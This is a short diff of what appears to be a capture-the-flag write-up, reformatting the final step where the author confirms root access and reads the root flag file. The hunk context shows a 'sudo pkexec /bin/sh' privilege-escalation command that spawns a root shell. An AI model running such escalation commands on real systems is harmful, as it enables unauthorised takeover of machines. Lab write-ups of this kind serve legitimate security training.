@@ -118,7 +118,6 @@ sudo /usr/bin/pkexec /bin/sh
 Final Root Flag
 I confirmed I was root and then read the final flag to finish the machine.
 
-
-# whoami
+whoami
 root
-# cat /root/root.txt
+cat /root/root.txt
